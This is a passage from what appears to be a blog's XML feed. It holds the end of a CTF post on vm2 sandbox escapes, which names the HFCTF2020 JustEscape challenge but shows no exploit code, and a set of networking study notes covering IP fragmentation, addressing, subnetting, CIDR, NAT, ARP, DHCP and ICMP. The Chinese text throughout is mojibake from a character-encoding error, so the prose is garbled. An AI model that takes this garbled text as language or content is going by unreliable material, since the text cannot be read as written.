ç»“æ„å˜äº†åœ¨æ–°çš„vm2ä¸­</p><p><img src="http://cdn.clown2024.cn/202407151754031.png" alt="image-20240310101817366"></p><p>è¿˜æœ‰ä¸€ç¯‡æ–‡ç« åˆ†æäº†ä¸¤ä¸ªæ¡ˆä¾‹ï¼š<a href="https://www.anquanke.com/post/id/207291">vm2æ²™ç®±é€ƒé€¸åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h1 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h1><p>è¿™é‡Œæ‰¾å‡ é“é¢˜åˆ†æå§ï¼Œvm2åŸç†çœ‹å¾—å¤´å¤§ã€‚</p><h2 id="hfctf2020justescape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>è¿™é¢˜åœ¨buuä¸Šé¢æœ‰</p>]]></content>
      
      
      <categories>
          
          <category> ctf web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web ctf nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œ-4</title>
      <link href="/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/"/>
      <url>/2024/03/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-4/</url>
      
        <content type="html"><![CDATA[<h1 id="ç½‘ç»œå±‚æ¦‚è¿°"><a href="#ç½‘ç»œå±‚æ¦‚è¿°" class="headerlink" title="ç½‘ç»œå±‚æ¦‚è¿°"></a>ç½‘ç»œå±‚æ¦‚è¿°</h1><p>è¿™é‡Œæ”¾ä¸ªå¯¼å›¾</p><p><img src="http://cdn.clown2024.cn/202407151707703.png" alt="image-20240306232043207"></p><p>ç½‘ç»œå±‚ä¸»è¦ä»»åŠ¡æ˜¯æŠŠåˆ†ç»„ä»æºç«¯ä¼ åˆ°ç›®çš„ç«¯ï¼Œä¸ºåˆ†ç»„äº¤æ¢ç½‘ä¸Šçš„ä¸åŒä¸»æœºæä¾›é€šä¿¡æœåŠ¡ã€‚</p><p>ç½‘ç»œå±‚ä¼ è¾“å•ä½æ˜¯æ•°æ®æŠ¥ã€‚</p><p><strong>ç½‘ç»œå±‚çš„åŠŸèƒ½</strong></p><ul><li><p>åŠŸèƒ½ä¸€:è·¯ç”±é€‰æ‹©ä¸åˆ†ç»„è½¬å‘(é€‰æ‹©æœ€ä½³è·¯å¾„)</p></li><li><p>åŠŸèƒ½äºŒ:å¼‚æ„ç½‘ç»œäº’è”</p></li><li><p>åŠŸèƒ½ä¸‰:æ‹¥å¡æ§åˆ¶</p><p>è‹¥æ‰€æœ‰ç»“ç‚¹éƒ½æ¥ä¸åŠæ¥å—åˆ†ç»„ï¼Œè€Œè¦ä¸¢å¼ƒå¤§é‡åˆ†ç»„çš„è¯ï¼Œç½‘ç»œå°±å¤„äºæ‹¥å¡çŠ¶æ€ã€‚å› æ­¤è¦é‡‡å–ä¸€å®šæªæ–½ç¼“è§£è¿™ç§æ‹¥å¡ï¼›</p><p>æ‹¥å¡æ§åˆ¶æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>å¼€ç¯æ§åˆ¶ï¼šè¿™æ˜¯é™æ€çš„ï¼Œå³æå‰è€ƒè™‘ç½‘ç»œä¼šäº§ç”Ÿæ‹¥å¡çš„å„ç§æƒ…å†µå¹¶åšå¥½å‡†å¤‡</li><li>é—­ç¯æ§åˆ¶ï¼šè¿™æ˜¯åŠ¨æ€çš„ï¼Œå³åœ¨ç½‘ç»œè¿è¡Œçš„æ—¶å€™è¿›è¡Œå®æ—¶è°ƒæ•´</li></ul></li></ul><h1 id="ipæ•°æ®æŠ¥æ ¼å¼"><a href="#IPæ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="IPæ•°æ®æŠ¥æ ¼å¼"></a>IPæ•°æ®æŠ¥æ ¼å¼</h1><p>IPåè®®åœ¨ç½‘ç»œå±‚çš„å æ¯”å¾ˆå¤§</p><p><img src="http://cdn.clown2024.cn/202407151707704.png" alt="image-20240307125809633"></p><p><strong>ipæ•°æ®åŒ…çš„æ•´ä½“ç»“æ„</strong></p><p><img src="http://cdn.clown2024.cn/202407151707705.png" alt="image-20240307141005938"></p><p>æ•°æ®éƒ¨åˆ†å°±æ˜¯ä¼ è¾“å±‚çš„æŠ¥æ–‡æ®µ</p><p><strong>å…·ä½“æ ¼å¼</strong><br><img src="http://cdn.clown2024.cn/202407151707706.png" alt="image-20240307141105140"></p><h1 id="ipæ•°æ®æŠ¥åˆ†ç‰‡"><a href="#IPæ•°æ®æŠ¥åˆ†ç‰‡" class="headerlink" title="IPæ•°æ®æŠ¥åˆ†ç‰‡"></a>IPæ•°æ®æŠ¥åˆ†ç‰‡</h1><p><strong>æœ€å¤§ä¼ é€å•å…ƒMTU</strong></p><p>é“¾è·¯å±‚æ•°æ®å¸§å¯å°è£…çš„æ•°æ®çš„ä¸Šé™</p><p>ä»¥å¤ªç½‘çš„MTUæ˜¯1500å­—èŠ‚</p><p><img src="http://cdn.clown2024.cn/202407151707707.png" alt="image-20240307141645466"></p><p>é“¾è·¯å±‚çš„æ•°æ®å¸§çš„æ•°æ®éƒ¨åˆ†å°±æ˜¯IPåˆ†ç»„ï¼Œæ‰€ä»¥IPåˆ†ç»„å¤§å°ä¸èƒ½è¶…è¿‡MTUï¼Œä»¥å¤ªç½‘å°±æ˜¯ä¸èƒ½è¶…è¿‡1500å­—èŠ‚ï¼›å¦‚æœè¶…è¿‡äº†MTUå°±è¦é‡‡å–æ•°æ®æŠ¥åˆ†ç‰‡çš„æ–¹æ³•ã€‚</p><p><strong>åˆ†ç‰‡</strong></p><p>åˆ†ç‰‡çš„å°±å’Œä¸Šé¢æ•°æ®æŠ¥ä¸­çš„æ ‡è¯†ã€æ ‡å¿—ã€ç‰‡åç§»ä¸‰ä¸ªéƒ¨åˆ†ç›¸å…³</p><ul><li><p>æ ‡è¯†ï¼šåŒä¸€æ•°æ®æŠ¥çš„åˆ†ç‰‡ä½¿ç”¨åŒä¸€æ ‡è¯†ã€‚æ¯”å¦‚æœ‰ä¸‰ä¸ªæ•°æ®æŠ¥ä»–ä»¬çš„æ ‡è¯†éƒ½æ˜¯888ï¼Œé‚£ä»–ä»¬å°±æ˜¯å±äºåŒä¸€ä¸ªæ•°æ®æŠ¥ï¼Œæœ€åä¼šé‡æ–°ç»„åˆæˆä¸€ä¸ªå®Œæ•´çš„æ•°æ®æŠ¥ã€‚</p></li><li><p>æ ‡å¿—ï¼šåªæœ‰ä¸¤ä½æœ‰æ„ä¹‰</p><p>ä¸­é—´ä½DFï¼ˆDonâ€™t Fragmentï¼‰ï¼šDF&#x3D;1,ç¦æ­¢åˆ†ç‰‡ï¼›DF&#x3D;0ï¼Œå…è®¸åˆ†ç‰‡ã€‚</p><p>æœ€ä½ä½MFï¼ˆMore Fragmentï¼‰ï¼šMF&#x3D;1ï¼Œåé¢è¿˜æœ‰åˆ†ç‰‡ï¼›MF&#x3D;0ï¼Œä»£è¡¨æœ€åä¸€ç‰‡&#x2F;æ²¡åˆ†ç‰‡ã€‚</p><p>æœ€ä½ä½è¦åœ¨DFä¸º0æ˜¯æ‰æœ‰è®¨è®ºæ„ä¹‰</p></li><li><p>ç‰‡åç§»ï¼šæŒ‡å‡ºè¾ƒé•¿åˆ†ç»„åˆ†ç‰‡åï¼ŒæŸç‰‡åœ¨åŸåˆ†ç»„ä¸­çš„ç›¸å¯¹ä½ç½®ï¼Œä»¥8Bä¸ºå•ä½ã€‚</p><p>æ¯”å¦‚ç‰‡åç§»å­—æ®µä¸º0000000000001ï¼Œåˆ™ä»£è¡¨è¯¥åˆ†ç‰‡åœ¨8Bçš„ä½ç½®å¼€å§‹ã€‚</p><p>æ‰€ä»¥é™¤äº†æœ€åä¸€ä¸ªåˆ†ç‰‡ä¸ä¸€å®šï¼Œæ¯ä¸ªåˆ†ç‰‡çš„é•¿åº¦ä¸€å®šæ˜¯8Bçš„æ•´æ•°å€ã€‚</p></li></ul><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¸€ä¸ªå¾ˆåŸºç¡€çš„ä¾‹é¢˜ï¼Œå¯¹ä¸Šé¢ä¸€äº›æ¦‚å¿µçš„è¿ç”¨å’Œç®€å•è®¡ç®—</p><p><img src="http://cdn.clown2024.cn/202407151707708.png" alt="image-20240307143646764"></p><h1 id="ipv4åœ°å€"><a href="#IPv4åœ°å€" class="headerlink" title="IPv4åœ°å€"></a>IPv4åœ°å€</h1><h2 id="ipåˆ†ç±»çš„å†å²é˜¶æ®µ"><a href="#IPåˆ†ç±»çš„å†å²é˜¶æ®µ" class="headerlink" title="IPåˆ†ç±»çš„å†å²é˜¶æ®µ"></a>IPåˆ†ç±»çš„å†å²é˜¶æ®µ</h2><p>åˆ†ç±»çš„IPåœ°å€&#x3D;ã€‹å­ç½‘çš„åˆ’åˆ†&#x3D;ã€‹æ„æˆè¶…ç½‘(æ— åˆ†ç±»ç¼–å€æ–¹æ³•)</p><h2 id="åˆ†ç±»çš„ipåœ°å€"><a href="#åˆ†ç±»çš„IPåœ°å€" class="headerlink" title="åˆ†ç±»çš„IPåœ°å€"></a>åˆ†ç±»çš„IPåœ°å€</h2><p>IPåœ°å€ï¼šå”¯ä¸€çš„32ä½&#x2F;4å­—èŠ‚æ ‡è¯†ç¬¦ï¼Œæ ‡è¯†è·¯ç”±å™¨ä¸»æœºçš„æ¥å£</p><p>IPåœ°å€&#x3D;{&lt;ç½‘ç»œå·&gt;,&lt;ä¸»æœºå·&gt;}</p><p>ä¸ºäº†æ–¹ä¾¿äººé˜…è¯»ï¼Œé‡‡ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„è½¬æ¢æ³•</p><p><img src="http://cdn.clown2024.cn/202407151707709.png" alt="image-20240307144802830"></p><p><strong>å„ç±»åˆ«IPåœ°å€åˆ’åˆ†</strong></p><p><img src="http://cdn.clown2024.cn/202407151707710.png" alt="image-20240307145139846"></p><p><strong>ç‰¹æ®ŠIPåœ°å€</strong></p><p><img src="http://cdn.clown2024.cn/202407151707711.png" alt="image-20240307145608889"></p><p><strong>ç§æœ‰IPåœ°å€</strong></p><p><img src="http://cdn.clown2024.cn/202407151707712.png" alt="image-20240307145720156"></p><p><strong>å¯ç”¨ç½‘ç»œå·å’Œä¸»æœºæ•°è®¡ç®—</strong></p><p><img src="http://cdn.clown2024.cn/202407151707713.png" alt="image-20240307150107170"></p><blockquote><p>ä¸»æœºæ•°éœ€è¦å‡å»å…¨0å’Œå…¨1ä¸¤ç§ç‰¹æ®Šæƒ…å†µ</p><p>ç½‘ç»œæ•°Aç±»éœ€è¦å‡å»å…¨0å’Œ127ï¼ŒBç±»å’ŒCç±»åªè¦å‡å»å…¨0</p></blockquote><h1 id="ç½‘ç»œåœ°å€è½¬æ¢nat"><a href="#ç½‘ç»œåœ°å€è½¬æ¢NAT" class="headerlink" title="ç½‘ç»œåœ°å€è½¬æ¢NAT"></a>ç½‘ç»œåœ°å€è½¬æ¢NAT</h1><p>å› ä¸ºè·¯ç”±å™¨å¯¹ç›®çš„åœ°å€æ˜¯ç§æœ‰IPåœ°å€çš„æ•°æ®æŠ¥ä¸€å¾‹ä¸è¿›è¡Œè½¬å‘ï¼Œé‚£æˆ‘ä»¬å¹³æ—¶ä¸Šç½‘æ˜¯æ€ä¹ˆå»å¤–ç•Œé€šä¿¡å‘¢ï¼Œå°±æ˜¯ç”¨åˆ°äº†NATæŠ€æœ¯ã€‚</p><p><strong>ç½‘ç»œåœ°å€è½¬æ¢NAT(NetworkAddress Translation)ï¼š</strong>åœ¨ä¸“ç”¨ç½‘è¿æ¥åˆ°å› ç‰¹ç½‘çš„è·¯ç”±å™¨ä¸Šå®‰è£…NATè½¯ä»¶ï¼Œå®‰è£…äº†NATè½¯ä»¶çš„è·¯ç”±å™¨å«NATè·¯ç”±å™¨ï¼Œå®ƒè‡³å°‘æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å¤–éƒ¨å…¨çƒIPåœ°å€ã€‚è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹å›¾</p><p><img src="http://cdn.clown2024.cn/202407151707714.png" alt="image-20240307151440901"></p><h1 id="å­ç½‘åˆ’åˆ†ä¸å­ç½‘æ©ç "><a href="#å­ç½‘åˆ’åˆ†ä¸å­ç½‘æ©ç " class="headerlink" title="å­ç½‘åˆ’åˆ†ä¸å­ç½‘æ©ç "></a>å­ç½‘åˆ’åˆ†ä¸å­ç½‘æ©ç </h1><h2 id="å­ç½‘åˆ’åˆ†"><a href="#å­ç½‘åˆ’åˆ†" class="headerlink" title="å­ç½‘åˆ’åˆ†"></a>å­ç½‘åˆ’åˆ†</h2><p>å°±æ˜¯å°†**{&lt;ç½‘ç»œå·&gt;,&lt;ä¸»æœºå·&gt;}<strong>è¿™æ ·çš„ä¸¤çº§IPåœ°å€å˜æˆ</strong>{&lt;ç½‘ç»œå·&gt;,&lt;å­ç½‘å·&gt;,&lt;ä¸»æœºå·&gt;}**è¿™æ ·çš„ä¸‰çº§IPåœ°å€ï¼›ä¸è¿‡å¤–ç•Œæ˜¯ä¸çŸ¥é“å†…éƒ¨çš„å­ç½‘å¦‚ä½•åˆ’åˆ†çš„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707715.png" alt="image-20240307152212955"></p><h2 id="å­ç½‘æ©ç "><a href="#å­ç½‘æ©ç " class="headerlink" title="å­ç½‘æ©ç "></a>å­ç½‘æ©ç </h2><p>ç½‘ç»œå·(å­ç½‘å·ä¹Ÿæ˜¯)å¯¹åº”çš„äºŒè¿›åˆ¶ä½å…¨ä¸º1ï¼Œä¸»æœºå·åˆ™å…¨ä¸º0ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707716.png" alt="image-20240307221224860"></p><blockquote><p>å­ç½‘æ©ç ä¸IPåœ°å€é€ä½ç›¸ä¸ï¼Œå°±å¾—åˆ°å­ç½‘ç½‘ç»œåœ°å€</p></blockquote><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p>å·²çŸ¥IPåœ°å€141.14.72.24ï¼Œå­ç½‘æ©ç æ˜¯255.255.192.0ï¼Œæ±‚ç½‘ç»œåœ°å€</p><p>ç›´æ¥ä¸­é—´8ä½çš„192å†™å‡ºæ¥å’Œ72ä¸€ä¸å°±å¯ä»¥å¾—åˆ°64ï¼Œæ‰€ä»¥å­ç½‘ç½‘ç»œå·ä¸º141.14.64.0ã€‚</p><h2 id="ä½¿ç”¨å­ç½‘æ—¶çš„åˆ†ç»„è½¬å‘"><a href="#ä½¿ç”¨å­ç½‘æ—¶çš„åˆ†ç»„è½¬å‘" class="headerlink" title="ä½¿ç”¨å­ç½‘æ—¶çš„åˆ†ç»„è½¬å‘"></a>ä½¿ç”¨å­ç½‘æ—¶çš„åˆ†ç»„è½¬å‘</h2><p><img src="http://cdn.clown2024.cn/202407151707717.png" alt="image-20240307222755852"></p><h1 id="æ— åˆ†ç±»ç¼–å€cidr"><a href="#æ— åˆ†ç±»ç¼–å€CIDR" class="headerlink" title="æ— åˆ†ç±»ç¼–å€CIDR"></a>æ— åˆ†ç±»ç¼–å€CIDR</h1><p><strong>CIDRæ¶ˆé™¤äº†ä¼ ç»Ÿçš„Aç±»ï¼ŒBç±»å’ŒCç±»åœ°å€ä»¥åŠåˆ’åˆ†å­ç½‘çš„æ¦‚å¿µï¼›ç½‘ç»œå·å’Œå­ç½‘å·ç»Ÿä¸€å˜æˆç½‘ç»œå‰ç¼€ã€‚</strong></p><p><img src="http://cdn.clown2024.cn/202407151707718.png" alt="image-20240307230252926"></p><blockquote><p>CIDRçš„å†™æ³•æ˜¯IPåœ°å€ååŠ ä¸Š&#x2F;ï¼Œç„¶åå†™ä¸Šç½‘ç»œå‰ç¼€çš„ä½æ•°ï¼Œæ¯”å¦‚ï¼š128.14.32.0&#x2F;20</p></blockquote><p><strong>CIDRèåˆå­ç½‘åœ°å€ä¸å­ç½‘æ©ç ï¼Œæ–¹ä¾¿å­ç½‘åˆ’åˆ†</strong></p><p><img src="http://cdn.clown2024.cn/202407151707719.png" alt="image-20240307230656231"></p><h2 id="æ„æˆè¶…ç½‘"><a href="#æ„æˆè¶…ç½‘" class="headerlink" title="æ„æˆè¶…ç½‘"></a>æ„æˆè¶…ç½‘</h2><p>å°†å¤šä¸ªå­ç½‘èšåˆæˆä¸€ä¸ªè¾ƒå¤§çš„å­ç½‘ï¼Œå«åšæ„æˆè¶…ç½‘ï¼Œæˆ–è·¯ç”±èšåˆã€‚</p><p>å…¶æ–¹æ³•å°±æ˜¯å°†ç½‘ç»œå‰ç¼€ç¼©çŸ­ï¼Œåœ¨æ‰€æœ‰çš„ç½‘ç»œåœ°å€å–äº¤é›†ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707720.png" alt="image-20240307231403673"></p><p>æ¯”å¦‚ä¸Šé¢çš„IPåœ°å€çš„äº¤é›†å°±æ˜¯å‰16ä½ï¼Œç„¶åå°±æŠŠå‰16ä½å½“ä½œæ–°çš„ç½‘ç»œå‰ç¼€ã€‚</p><h2 id="æœ€é•¿å‰ç¼€åŒ¹é…"><a href="#æœ€é•¿å‰ç¼€åŒ¹é…" class="headerlink" title="æœ€é•¿å‰ç¼€åŒ¹é…"></a>æœ€é•¿å‰ç¼€åŒ¹é…</h2><p>ä½¿ç”¨CIDRæ—¶ï¼ŒæŸ¥æ‰¾è·¯ç”±è¡¨å¯èƒ½å¾—åˆ°å‡ ä¸ªåŒ¹é…ç»“æœ(è·Ÿç½‘ç»œæ©ç æŒ‰ä½ç›¸ä¸)ï¼Œåº”é€‰æ‹©å…·æœ‰æœ€é•¿ç½‘ç»œå‰ç¼€çš„è·¯ç”±ã€‚<br>å‰ç¼€è¶Šé•¿ï¼Œåœ°å€å—è¶Šå°ï¼Œè·¯ç”±è¶Šå…·ä½“ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151707721.png" alt="image-20240308001842598"></p><p>ç›®çš„åœ°å€åˆ†åˆ«ä¸ä¸Šè¿°è·¯ç”±è¡¨ä¸­çš„æ‰€æœ‰åœ°å€å—è¿›è¡ŒåŒ¹é…ï¼Œå·¦è¾¹ä¸¤ä¸ªéƒ½èƒ½æˆåŠŸåŒ¹é…åˆ°ç½‘ç»œå·ï¼Œè€Œè®¡ç®—æœºç³»çš„ç½‘ç»œå‰ç¼€æœ€é•¿ï¼Œæ‰€ä»¥ä¼šå‘é€ç»™è®¡ç®—æœºç³»ã€‚</p><h1 id="arpåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h1><p>ARPåè®®æœ‰ç‚¹ç±»ä¼¼äºç½‘ç»œå±‚å’Œé“¾è·¯å±‚çš„ä¸€ä¸ªä¸­é—´åè®®ï¼Œå› ä¸ºARPåè®®å°±æ˜¯å®Œæˆä¸»æœºæˆ–è·¯ç”±å™¨IPåœ°å€åˆ°MACåœ°å€çš„æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯è§£å†³ä¸‹ä¸€è·³èµ°å“ªçš„é—®é¢˜ã€‚</p><blockquote><p>åœ¨å®é™…ç½‘ç»œçš„é“¾è·¯ä¸Šä¼ è¾“æ•°æ®å¸§æ—¶ï¼Œæœ€ç»ˆå¿…é¡»ä½¿ç”¨MACåœ°å€</p></blockquote><p><strong>ARPåè®®ä½¿ç”¨è¿‡ç¨‹</strong></p><p>æ£€æŸ¥ARPé«˜é€Ÿç¼“å­˜ï¼Œæœ‰å¯¹åº”è¡¨é¡¹åˆ™å†™å…¥MACå¸§ï¼Œæ²¡æœ‰åˆ™ç”¨ç›®çš„MACåœ°å€ä¸ºFF-FF-FF-FF-FF-FFçš„å¸§å°è£…å¹¶å¹¿æ’­ARPè¯·æ±‚åˆ†ç»„ï¼ŒåŒä¸€å±€åŸŸç½‘ä¸­æ‰€æœ‰ä¸»æœºéƒ½èƒ½æ”¶åˆ°è¯¥è¯·æ±‚ã€‚ç›®çš„ä¸»æœºæ”¶åˆ°è¯·æ±‚åå°±ä¼šå‘æºä¸»æœºå•æ’­ä¸€ä¸ªARPå“åº”åˆ†ç»„ï¼Œæºä¸»æœºæ”¶åˆ°åå°†æ­¤æ˜ å°„å†™å…¥ARPç¼“å­˜(10-20minæ›´æ–°ä¸€æ¬¡)ã€‚</p><p><strong>ARPåè®®çš„å››ç§å…¸å‹æƒ…å†µ</strong></p><ol><li><p>ä¸»æœºAå‘ç»™æœ¬ç½‘ç»œä¸Šçš„ä¸»æœºB:ç”¨ARPæ‰¾åˆ°ä¸»æœºBçš„ç¡¬ä»¶åœ°å€;</p></li><li><p>ä¸»æœºAå‘ç»™å¦ä¸€ç½‘ç»œä¸Šçš„ä¸»æœºB:ç”¨ARPæ‰¾åˆ°æœ¬ç½‘ç»œä¸Šä¸€ä¸ªè·¯ç”±å™¨(ç½‘å…³)çš„ç¡¬ä»¶åœ°å€ï¼›</p></li><li><p>è·¯ç”±å™¨å‘ç»™æœ¬ç½‘ç»œçš„ä¸»æœºA:ç”¨ARPæ‰¾åˆ°ä¸»æœºAçš„ç¡¬ä»¶åœ°å€ï¼›</p></li><li><p>è·¯ç”±å™¨å‘ç»™å¦ä¸€ç½‘ç»œçš„ä¸»æœºB:ç”¨ARPæ‰¾åˆ°æœ¬ç½‘ç»œä¸Šçš„ä¸€ä¸ªè·¯ç”±å™¨çš„ç¡¬ä»¶åœ°å€ã€‚</p></li></ol><p><strong>ä¸‹é¢ç”¨å‘æœ¬å±€åŸŸç½‘ä¸»æœºå‘é€æ•°æ®å’Œå‘å…¶ä»–å±€åŸŸç½‘ä¸»æœºå‘é€æ•°æ®çš„ä¸¤ä¸ªä¾‹å­æ¥è¯´æ˜ARPåè®®çš„è¿ç”¨</strong></p><p><img src="http://cdn.clown2024.cn/202407151707722.png" alt="image-20240308153147166"></p><p>ç°åœ¨æ˜¯å‘æœ¬å±€åŸŸç½‘å†…çš„3å·ä¸»æœºå‘é€æ•°æ®ï¼Œé¦–å…ˆä¼šåœ¨æœ¬åœ°çš„ARPé«˜é€Ÿç¼“å­˜ä¸­æ£€æŸ¥æœ‰æ²¡æœ‰3å·ä¸»æœºå¯¹åº”çš„macåœ°å€ï¼Œæ²¡æœ‰çš„è¯å°±ä¼šå¦IP3ä¸ºå…¨1å‘é€ä¸€ä¸ªå¹¿æ’­åˆ†ç»„ï¼Œäº¤æ¢æœºæ”¶åˆ°è¯·æ±‚ä¹‹åå°±ä¼šå‘é€ç»™æ‰€æœ‰ä¸»æœºï¼Œæ‰€æœ‰ä¸»æœºæ”¶åˆ°è¯·æ±‚åï¼Œå¦‚æœæ˜¯å¯¹åº”çš„IPåœ°å€å°±ä¼šè¿”å›ä¸€ä¸ªå•æ’­ARPå“åº”åˆ†ç»„ï¼Œå…¶ä¸­å°±åŒ…å«äº†è‡ªå·±çš„macåœ°å€ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707723.png" alt="image-20240308154025422"></p><p>è¿™æ˜¯å‘éå±€åŸŸç½‘å†…çš„5å·ä¸»æœºä¼ è¾“æ•°æ®ï¼Œä¼šå…ˆå°†IP5ä¸è‡ªå·±çš„å­ç½‘æ©ç ç›¸ä¸ä¸€ä¸‹çœ‹æ˜¯å¦åœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œå¦‚æœä¸åœ¨å°±ç›´æ¥è·³åˆ°è‡ªå·±çš„é»˜è®¤ç½‘å…³ï¼Œå±€åŸŸç½‘å†…çš„ä¸»æœºéƒ½çŸ¥é“è‡ªå·±çš„é»˜è®¤ç½‘å…³åœ°å€ï¼Œç„¶åå°±å¯ä»¥å‘é€å¹¿æ’­åˆ†ç»„å¾—åˆ°é»˜è®¤ç½‘å…³çš„macåœ°å€ï¼Œç„¶åè¿™é‡Œå°±å¡«ä¸Šmac6å‘é€åˆ°é»˜è®¤ç½‘å…³ï¼Œåé¢çš„macåœ°å€çš„æ”¹å˜è°ƒæ•´æ˜¯è·¯ç”±å™¨è½¬å‘æ•°æ®å‡ºå»æ—¶è‡ªå·±å†…éƒ¨æ”¹å˜çš„ï¼ŒåŒ…å«è‡ªèº«macåœ°å€å’Œè¦å»çš„macåœ°å€ã€‚</p><blockquote><p>äº¤æ¢æœºæ˜¯æ²¡æœ‰macåœ°å€çš„ï¼Œè¦ä¸»æœºå’Œè·¯ç”±å™¨æ¥å£æ‰æœ‰ã€‚</p><p>é»˜è®¤ç½‘å…³å°±æ˜¯æœ¬å±€åŸŸç½‘å’Œå¤–ç•Œé€šä¿¡çš„ä¸€ä¸ªæ¥å£ã€‚</p></blockquote><h1 id="dhcpåè®®"><a href="#DHCPåè®®" class="headerlink" title="DHCPåè®®"></a>DHCPåè®®</h1><h2 id="ä¸»æœºè¦å¦‚ä½•è·å¾—ipåœ°å€"><a href="#ä¸»æœºè¦å¦‚ä½•è·å¾—IPåœ°å€" class="headerlink" title="ä¸»æœºè¦å¦‚ä½•è·å¾—IPåœ°å€"></a>ä¸»æœºè¦å¦‚ä½•è·å¾—IPåœ°å€</h2><ol><li><p>é™æ€é…ç½®ï¼šä¹Ÿå°±æ˜¯ç®¡ç†ç”±æ‰‹åŠ¨é…ç½®<strong>IPåœ°å€</strong>ï¼Œ<strong>å­ç½‘æ©ç </strong>ï¼Œ<strong>é»˜è®¤ç½‘å…³</strong>è¿™äº›ä¸œè¥¿</p></li><li><p>åŠ¨æ€é…ç½®ï¼šè¿™å°±æ˜¯åˆ©ç”¨DHCPæœåŠ¡å™¨æ¥ç»™å±€åŸŸç½‘å†…çš„ä¸»æœºè‡ªåŠ¨åˆ†é…ä¸€ä¸ªIPåœ°å€</p><p><img src="http://cdn.clown2024.cn/202407151707724.png" alt="image-20240308155102460"></p></li></ol><h2 id="dhcpå·¥ä½œè¿‡ç¨‹"><a href="#DHCPå·¥ä½œè¿‡ç¨‹" class="headerlink" title="DHCPå·¥ä½œè¿‡ç¨‹"></a>DHCPå·¥ä½œè¿‡ç¨‹</h2><p><strong>åŠ¨æ€ä¸»æœºé…ç½®åè®®DHCPæ˜¯åº”ç”¨å±‚åè®®ï¼Œ</strong>ä½¿ç”¨å®¢æˆ·&#x2F;æœåŠ¡å™¨æ–¹å¼ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šè¿‡å¹¿æ’­æ–¹å¼è¿›è¡Œäº¤äº’ï¼ŒåŸºäºUDPã€‚</p><p>DHCPæä¾›å³æ’å³ç”¨è”ç½‘çš„æœºåˆ¶ï¼Œä¸»æœºå¯ä»¥ä»æœåŠ¡å™¨åŠ¨æ€è·å–IPåœ°å€ã€å­ç½‘æ©ç ã€é»˜è®¤ç½‘å…³ã€DNSæœåŠ¡å™¨åç§°ä¸IPåœ°å€ï¼Œå…è®¸åœ°å€é‡ç”¨ï¼Œæ”¯æŒç§»åŠ¨ç”¨æˆ·åŠ å…¥ç½‘ç»œï¼Œæ”¯æŒåœ¨ç”¨åœ°å€ç»­ç§Ÿã€‚</p><p><strong>æµç¨‹</strong></p><ol><li>ä¸»æœºå¹¿æ’­DHCPå‘ç°æŠ¥æ–‡ï¼Œä¹Ÿå°±æ˜¯æ¢æµ‹ç½‘ç»œä¸­æ˜¯å¦æœ‰DHCPæœåŠ¡å™¨ï¼Œè¯·æ±‚è·å¾—IPåœ°å€</li><li>DHCPæœåŠ¡å™¨å¹¿æ’­DHCPæä¾›æŠ¥æ–‡ï¼Œæ”¶åˆ°è¯·æ±‚çš„æœåŠ¡å™¨å¦‚æœæœ‰ç©ºé—²çš„IPåœ°å€åŠå…¶ç›¸å…³é…ç½®éƒ½ä¼šå¹¿æ’­å‘é€å‡ºå»</li><li>ä¸»æœºå¹¿æ’­DHCPè¯·æ±‚æŠ¥æ–‡ï¼Œæ”¶åˆ°å¤šä¸ªæä¾›æŠ¥æ–‡ï¼Œé€‰æ‹©å…¶ä¸­çš„ä¸€ä¸ªIPåœ°å€ä½¿ç”¨(å…ˆåˆ°å…ˆå¾—)ï¼Œå¹¿æ’­å‘é€ç¡®è®¤ä½¿ç”¨è¯¥IPåœ°å€</li><li>DHCPæœåŠ¡å™¨å¹¿æ’­DHCPç¡®è®¤æŠ¥æ–‡ï¼Œæ­£å¼å°†è¯¥IPåˆ†é…ç»™ä¸»æœº</li></ol><h1 id="icmpåè®®"><a href="#ICMPåè®®" class="headerlink" title="ICMPåè®®"></a>ICMPåè®®</h1><p>ICMPåè®®èµ·åˆ°ä¼ è¾“å±‚å’Œç½‘ç»œå±‚çš„æ¡¥æ¢ä½œç”¨ã€‚</p><p>ICMPåè®®æ”¯æŒä¸»æœºæˆ–è·¯ç”±å™¨ï¼Œåœ¨ç½‘ç»œå±‚çš„åˆ†ç»„å‡ºé”™æ—¶ï¼Œåœ¨åˆ†ç»„è¢«ä¸¢å¼ƒä¹‹åéœ€è¦å‘é€ä¸€ä¸ªå·®é”™(æˆ–å¼‚å¸¸æŠ¥å‘Š)ï¼Œä¹Ÿå°±æ˜¯å‘é€ç‰¹å®šICMPæŠ¥æ–‡ï¼šICMPå·®é”™æŠ¥æ–‡ï¼ŒICMPè¯¢é—®æŠ¥æ–‡</p><h2 id="icmpç»“æ„"><a href="#ICMPç»“æ„" class="headerlink" 